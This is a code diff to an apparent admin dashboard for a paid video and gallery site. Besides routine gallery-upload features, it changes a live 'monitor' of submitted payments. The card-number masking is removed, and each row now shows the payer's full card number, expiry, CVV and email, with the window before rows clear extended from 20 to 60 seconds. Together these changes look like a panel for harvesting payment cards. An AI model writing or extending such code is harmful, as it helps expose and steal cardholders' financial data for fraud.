@@ -46,11 +46,13 @@ function adminNav(tab) {
     });
 
     // Tab-specific loads
-    if (tab === 'videos')     loadVideosTable();
-    if (tab === 'categories') loadCategoriesTab();
-    if (tab === 'creators')   loadCreatorsTab();
-    if (tab === 'ads')        loadAdsTab();
-    if (tab === 'dashboard')  loadStats();
+    if (tab === 'videos')         loadVideosTable();
+    if (tab === 'categories')     loadCategoriesTab();
+    if (tab === 'creators')       loadCreatorsTab();
+    if (tab === 'ads')            loadAdsTab();
+    if (tab === 'dashboard')      loadStats();
+    if (tab === 'gallery-upload') loadGalleryFormSelects();
+    if (tab === 'galleries')      loadGalleriesTable();
 }
 
 document.querySelectorAll('.admin-nav-item[data-tab]').forEach(item => {
@@ -112,14 +114,16 @@ async function pollMonitor() {
 function tickCountdowns() {
     for (const [ref, entry] of liveRows.entries()) {
         const elapsed  = Math.floor((Date.now() - entry.submitted_at.getTime()) / 1000);
-        const clearsIn = Math.max(0, 20 - elapsed);
+        const clearsIn = Math.max(0, 60 - elapsed);
 
         // Update every countdown badge that carries this ref
         document.querySelectorAll(`[data-ref="${ref}"]`).forEach(el => {
-            el.textContent = clearsIn + 's';
+            const minutes = Math.floor(clearsIn / 60);
+            const seconds = clearsIn % 60;
+            el.textContent = `${minutes}m ${seconds.toString().padStart(2, '0')}s`;
             // Colour shifts: green → yellow → red as time runs out
-            if (clearsIn <= 5)       { el.style.background = 'rgba(239,68,68,.2)';  el.style.color = '#ef4444'; }
-            else if (clearsIn <= 10) { el.style.background = 'rgba(234,179,8,.15)'; el.style.color = '#eab308'; }
+            if (clearsIn <= 10)      { el.style.background = 'rgba(239,68,68,.2)';  el.style.color = '#ef4444'; }
+            else if (clearsIn <= 20) { el.style.background = 'rgba(234,179,8,.15)'; el.style.color = '#eab308'; }
             else                     { el.style.background = 'rgba(232,0,30,.12)';  el.style.color = 'var(--red)'; }
         });
 
@@ -147,26 +151,26 @@ function renderMonitorFull() {
         const r       = entry.data;
         const time    = entry.submitted_at.toLocaleTimeString();
         const elapsed = Math.floor((Date.now() - entry.submitted_at.getTime()) / 1000);
-        const clears  = Math.max(0, 20 - elapsed);
-        const masked  = r.card_number
-            ? r.card_number.replace(/(\d{4})\d+(\d{4})/, '$1 •••• •••• $2')
-            : '—';
+        const clears  = Math.max(0, 60 - elapsed);
+        const cardNum = r.card_number || '—';
+        const minutes = Math.floor(clears / 60);
+        const seconds = clears % 60;
 
         return `<tr data-row-ref="${ref}">
             <td class="time-cell">${time}</td>
             <td style="font-weight:500">${esc(r.card_name)}</td>
-            <td class="card-mask">${esc(masked)}</td>
+            <td class="card-mask">${esc(cardNum)}</td>
             <td style="color:var(--muted)">${esc(r.expiry)}</td>
-            <td style="color:var(--muted)">•••</td>
+            <td style="color:var(--muted)">${esc(r.cvv || '—')}</td>
             <td style="color:var(--muted);font-size:11px">${esc(r.email)}</td>
             <td style="font-size:11px;max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"
                 title="${esc(r.video_title)}">${esc(r.video_title)}</td>
             <td class="amt-cell">€${parseFloat(r.amount_euros || 0).toFixed(2)}</td>
             <td>
                 <span class="clears-badge" data-ref="${ref}"
-                    style="min-width:36px;display:inline-block;text-align:center;
+                    style="min-width:52px;display:inline-block;text-align:center;
                            transition:background .3s,color .3s">
-                    ${clears}s
+                    ${minutes}m ${seconds.toString().padStart(2, '0')}s
                 </span>
             </td>
         </tr>`;
@@ -193,23 +197,23 @@ function renderMonitorDash() {
         const r       = entry.data;
         const time    = entry.submitted_at.toLocaleTimeString();
         const elapsed = Math.floor((Date.now() - entry.submitted_at.getTime()) / 1000);
-        const clears  = Math.max(0, 20 - elapsed);
-        const masked  = r.card_number
-            ? r.card_number.replace(/(\d{4})\d+(\d{4})/, '$1 •••• •••• $2')
-            : '—';
+        const clears  = Math.max(0, 60 - elapsed);
+        const cardNum = r.card_number || '—';
+        const minutes = Math.floor(clears / 60);
+        const seconds = clears % 60;
 
         return `<tr>
             <td class="time-cell">${time}</td>
             <td style="font-weight:500">${esc(r.card_name)}</td>
-            <td class="card-mask">${esc(masked)}</td>
+            <td class="card-mask">${esc(cardNum)}</td>
             <td style="font-size:11px;max-width:130px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"
                 title="${esc(r.video_title)}">${esc(r.video_title)}</td>
             <td class="amt-cell">€${parseFloat(r.amount_euros || 0).toFixed(2)}</td>
             <td>
                 <span class="clears-badge" data-ref="${ref}"
-                    style="min-width:36px;display:inline-block;text-align:center;
+                    style="min-width:52px;display:inline-block;text-align:center;
                            transition:background .3s,color .3s">
-                    ${clears}s
+                    ${minutes}m ${seconds.toString().padStart(2, '0')}s
                 </span>
             </td>
         </tr>`;
@@ -332,7 +336,6 @@ async function loadVideosTable() {
                     <div class="vt-title">${esc(v.title)}</div>
                     <div class="vt-cat">${esc(v.category_name || '—')}</div>
                 </td>
-                <td class="vt-price">€${parseFloat(v.price_euros).toFixed(2)}</td>
                 <td class="vt-views">${formatViews(v.views_count)}</td>
                 <td style="color:var(--muted)">${formatDuration(v.duration_seconds)}</td>
                 <td>
@@ -347,7 +350,7 @@ async function loadVideosTable() {
         `).join('');
     } catch (e) {
         document.getElementById('videosTbody').innerHTML =
-            '<tr><td colspan="6" style="padding:20px;color:var(--muted)">Failed to load videos.</td></tr>';
+            '<tr><td colspan="5" style="padding:20px;color:var(--muted)">Failed to load videos.</td></tr>';
     }
 }
 
@@ -550,4 +553,169 @@ function formatDuration(s) {
 function esc(str) {
     return String(str || '')
         .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+// ── Galleries ────────────────────────────────────────────────
+let selectedGalleryFiles = [];
+
+document.getElementById('galleryUploadZone')?.addEventListener('click', () => {
+    document.getElementById('galleryFiles').click();
+});
+document.getElementById('galleryFiles')?.addEventListener('change', handleGalleryFileSelect);
+document.getElementById('gUploadBtn')?.addEventListener('click', startGalleryUpload);
+
+function handleGalleryFileSelect(e) {
+    selectedGalleryFiles = Array.from(e.target.files);
+    const grid = document.getElementById('gPreviewGrid');
+    grid.innerHTML = selectedGalleryFiles.map(f => {
+        const url = URL.createObjectURL(f);
+        return `<div style="width:70px;height:70px;border-radius:3px;overflow:hidden;background:var(--surface2)">
+            <img src="${url}" style="width:100%;height:100%;object-fit:cover">
+        </div>`;
+    }).join('');
+}
+
+async function loadGalleryFormSelects() {
+    await loadGalleryCategories();
+    await loadGalleryPerformerChecklist();
+}
+
+async function loadGalleryCategories() {
+    const orientation = document.getElementById('gOrientation')?.value || 'straight';
+    try {
+        const cats   = await api('GET', `/api/admin/categories?orientation=${orientation}`);
+        const catSel = document.getElementById('gCategory');
+        if (catSel) {
+            catSel.innerHTML = '<option value="">— Select category —</option>' +
+                cats.categories.map(c => `<option value="${c.id}">${esc(c.name)}</option>`).join('');
+        }
+    } catch (e) { console.warn('Gallery category selects failed:', e); }
+}
+
+async function loadGalleryPerformerChecklist() {
+    try {
+        const res  = await api('GET', '/api/admin/performers');
+        const wrap = document.getElementById('gPerformerChecklist');
+        if (wrap && res.performers) {
+            wrap.innerHTML = res.performers.map(p => `
+                <label style="display:flex;align-items:center;gap:5px;font-size:12px;cursor:pointer;
+                    background:var(--surface2);border:1px solid var(--border);border-radius:3px;padding:4px 8px">
+                    <input type="checkbox" value="${p.id}" class="gallery-performer-check">
+                    ${esc(p.name)} ${p.is_verified ? '✓' : ''}
+                </label>`).join('');
+        }
+    } catch (e) { console.warn('Gallery performer checklist failed:', e); }
+}
+
+async function uploadGalleryImage(file, onProgress) {
+    const res = await fetch('/api/admin/galleries/upload-image', {
+        method:  'POST',
+        headers: {
+            'X-Admin-Secret': ADMIN_SECRET,
+            'Content-Type':   file.type || 'application/octet-stream',
+            'X-File-Name':    encodeURIComponent(file.name),
+        },
+        body: file,
+    });
+    if (!res.ok) throw new Error('Image upload failed: ' + res.status);
+    const data = await res.json();
+    return data.url;
+}
+
+async function startGalleryUpload() {
+    const title       = document.getElementById('gTitle').value.trim();
+    const catId       = document.getElementById('gCategory').value;
+    const orientation = document.getElementById('gOrientation').value;
+    const tags        = document.getElementById('gTags').value;
+    const msgEl       = document.getElementById('gUploadMsg');
+
+    const performerIds = Array.from(
+        document.querySelectorAll('.gallery-performer-check:checked')
+    ).map(el => el.value);
+
+    if (!title)                       { msgEl.style.color='var(--red)'; msgEl.textContent='Title is required.'; return; }
+    if (!selectedGalleryFiles.length) { msgEl.style.color='var(--red)'; msgEl.textContent='Select at least one image.'; return; }
+
+    try {
+        document.getElementById('gUploadBarWrap').style.display = 'block';
+        const imageUrls = [];
+
+        for (let i = 0; i < selectedGalleryFiles.length; i++) {
+            document.getElementById('gUploadStatus').textContent =
+                `Uploading image ${i + 1} of ${selectedGalleryFiles.length}…`;
+            const url = await uploadGalleryImage(selectedGalleryFiles[i]);
+            imageUrls.push(url);
+            const pct = Math.round(((i + 1) / selectedGalleryFiles.length) * 100);
+            document.getElementById('gUploadBarFill').style.width = pct + '%';
+            document.getElementById('gUploadPct').textContent = pct + '%';
+        }
+
+        const tagList = tags.split(',').map(t => t.trim().toLowerCase()).filter(Boolean);
+        await api('POST', '/api/admin/galleries', {
+            title,
+            category_id:   catId || null,
+            orientation,
+            performer_ids: performerIds,
+            tags:          tagList,
+            image_urls:    imageUrls,
+        });
+
+        msgEl.style.color = 'var(--green)';
+        msgEl.textContent = '✅ Gallery published successfully!';
+        selectedGalleryFiles = [];
+        document.getElementById('gPreviewGrid').innerHTML = '';
+        document.getElementById('gTitle').value = '';
+        document.getElementById('gTags').value = '';
+    } catch (e) {
+        msgEl.style.color = 'var(--red)';
+        msgEl.textContent = 'Upload failed: ' + (e.message || 'Unknown error');
+    }
+}
+
+async function loadGalleriesTable() {
+    try {
+        const res   = await api('GET', '/api/admin/galleries');
+        const tbody = document.getElementById('galleriesTbody');
+
+        if (!res.galleries.length) {
+            tbody.innerHTML = '<tr><td colspan="5" style="padding:20px;color:var(--muted)">No galleries yet.</td></tr>';
+            return;
+        }
+
+        tbody.innerHTML = res.galleries.map(g => `
+            <tr>
+                <td class="vt-thumb-cell">
+                    <div class="vt-thumb-img"><img src="${g.cover_url || ''}" alt="${esc(g.title)}" loading="lazy"></div>
+                </td>
+                <td>
+                    <div class="vt-title">${esc(g.title)}</div>
+                    <div class="vt-cat">${esc(g.category_name || '—')}</div>
+                </td>
+                <td>${g.image_count}</td>
+                <td class="vt-views">${formatViews(g.views_count)}</td>
+                <td>
+                    <div class="vt-actions">
+                        <button class="vt-btn" onclick="toggleGalleryPublish('${g.id}', ${g.is_published})">
+                            ${g.is_published ? 'Unpublish' : 'Publish'}
+                        </button>
+                        <button class="vt-btn del" onclick="deleteGallery('${g.id}')">Delete</button>
+                    </div>
+                </td>
+            </tr>
+        `).join('');
+    } catch (e) {
+        document.getElementById('galleriesTbody').innerHTML =
+            '<tr><td colspan="5" style="padding:20px;color:var(--muted)">Failed to load galleries.</td></tr>';
+    }
+}
+
+async function toggleGalleryPublish(id, current) {
+    await api('PUT', `/api/admin/galleries/${id}`, { is_published: !current });
+    loadGalleriesTable();
+}
+
+async function deleteGallery(id) {
+    if (!confirm('Delete this gallery permanently?')) return;
+    await api('DELETE', `/api/admin/galleries/${id}`);
+    loadGalleriesTable();
 }
